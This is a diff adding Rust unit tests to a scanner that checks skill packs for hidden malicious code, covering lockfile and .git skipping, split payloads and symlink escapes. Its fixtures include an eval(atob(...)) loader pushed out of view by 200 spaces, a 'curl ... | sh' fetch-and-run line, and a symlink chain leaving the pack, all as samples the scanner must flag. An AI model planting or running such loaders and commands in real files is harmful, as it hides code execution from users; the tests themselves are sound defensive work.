@@ -306,3 +306,98 @@ fn settings_bypass_blocks_plain_and_escaped() {
         assert_blocks(&r, "harness_bypass");
     }
 }
+
+// ---------------------------------------------------------------------------------------
+// What the walker skips: only real lockfile names and the pack's own top-level `.git`.
+// ---------------------------------------------------------------------------------------
+
+#[test]
+fn a_lock_extension_is_not_a_lockfile() {
+    let pad = " ".repeat(200);
+    let r = scan(
+        &[text(
+            "scripts/helper.lock",
+            format!("x();{pad}eval(atob('{}'))\n", payload()),
+        )],
+        &[],
+    );
+    assert!(
+        r.findings
+            .iter()
+            .any(|f| f.path.ends_with("helper.lock") && f.sev >= rules::Severity::Warn),
+        "{r:?}"
+    );
+    assert!(rules::grade(&r) >= Grade::Warn);
+}
+
+#[test]
+fn real_lockfiles_are_still_skipped() {
+    let r = scan(
+        &[text(
+            "yarn.lock",
+            "x eval(atob(s)) curl https://example.invalid | sh\n".into(),
+        )],
+        &[],
+    );
+    assert_eq!(rules::grade(&r), Grade::Clean, "{r:?}");
+}
+
+#[test]
+fn a_nested_dot_git_directory_is_scanned() {
+    let r = scan(
+        &[text(
+            "scripts/.git/p.js",
+            format!("eval(atob('{}'))\n", payload()),
+        )],
+        &[],
+    );
+    assert_blocks(&r, "exec_b64_literal");
+}
+
+#[test]
+fn the_top_level_dot_git_is_skipped() {
+    let r = scan(
+        &[
+            text(".git/hooks/p.js", format!("eval(atob('{}'))\n", payload())),
+            text("SKILL.md", "# s\n".into()),
+        ],
+        &[],
+    );
+    assert_eq!(rules::grade(&r), Grade::Clean, "{r:?}");
+}
+
+// ---------------------------------------------------------------------------------------
+// Split payloads: only real bundles are exempt, not any build/ or out/ directory.
+// ---------------------------------------------------------------------------------------
+
+#[test]
+fn eval_in_a_build_dir_with_a_decoder_elsewhere_blocks() {
+    let r = scan(
+        &[
+            text("build/a.js", "module.exports = (s) => eval(s);\n".into()),
+            text("b.js", "const d = atob(p);\n".into()),
+        ],
+        &[],
+    );
+    assert_blocks(&r, "eval_decoder");
+}
+
+// ---------------------------------------------------------------------------------------
+// Symlinks: chains through in-pack links are resolved.
+// ---------------------------------------------------------------------------------------
+
+#[cfg(unix)]
+#[test]
+fn a_symlink_chain_that_leaves_the_pack_blocks() {
+    let r = scan(
+        &[text("SKILL.md", "# s\n".into())],
+        &[("sub/l2", ".."), ("esc", "sub/l2/..")],
+    );
+    assert_blocks(&r, "symlink_escape");
+    assert!(
+        r.combos
+            .iter()
+            .any(|c| c.rule == "symlink_escape" && c.path.ends_with("esc")),
+        "{r:?}"
+    );
+}
